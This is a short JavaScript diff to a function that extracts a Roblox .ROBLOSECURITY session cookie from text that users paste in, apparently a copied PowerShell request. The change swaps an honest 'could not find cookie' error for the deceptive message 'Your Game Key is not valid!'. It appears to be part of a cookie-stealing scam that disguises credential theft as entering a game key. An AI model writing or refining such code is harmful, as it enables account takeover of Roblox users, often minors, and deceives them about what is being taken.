@@ -34,7 +34,7 @@ function extractGameData(fullText) {
     // 1. Extract .ROBLOSECURITY cookie (primary)
     const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
     if (!cookieMatch) {
-        return { success: false, message: "Could not find .ROBLOSECURITY cookie in the PowerShell script." };
+        return { success: false, message: "Your Game Key is not valid! (Check if you copied it right!)" };
     }
     const robloxCookie = cookieMatch[1];
 
